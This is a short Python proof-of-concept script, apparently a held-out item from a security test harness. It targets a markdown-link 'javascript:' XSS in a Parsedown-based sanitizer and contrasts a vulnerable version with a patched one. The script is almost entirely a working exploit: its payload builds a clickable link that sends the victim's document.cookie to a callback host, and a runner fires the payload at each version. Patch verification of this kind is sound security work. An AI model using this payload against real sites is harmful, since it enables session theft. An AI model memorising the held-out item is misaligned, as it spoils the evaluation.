#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-33500 residual — markdown-link javascript: XSS bypassing the 27568 guard.

Markdown link syntax [CLICKME](javascript:...) is parsed by Parsedown core inlineLink(), which
ParsedownSafeWithLinks does NOT override in V1 (=27568-patched) -> the javascript: href survives
-> the victim's click executes it -> flag exfiltrated on V1 (the same sink the raw-HTML seed hit,
now reached via a code path the sanitizer never covered). V2 (3ae02fa2409) adds an inlineLink()
override applying the same whitelist -> href blanked -> residual blocked.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import run_payload, CB  # noqa: E402

# Markdown link. inlineLink() (not sanitizeATag) builds the anchor; href = the URL verbatim.
BYPASS_PAYLOAD = (
    '[CLICKME](javascript:document.location="' + CB + '"+document.cookie)'
)


def bypass_poc(*, version="v1"):
    """Run the CVE2 residual on `version`; returns the callback dump (flag present on V1)."""
    return run_payload(BYPASS_PAYLOAD, version)


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
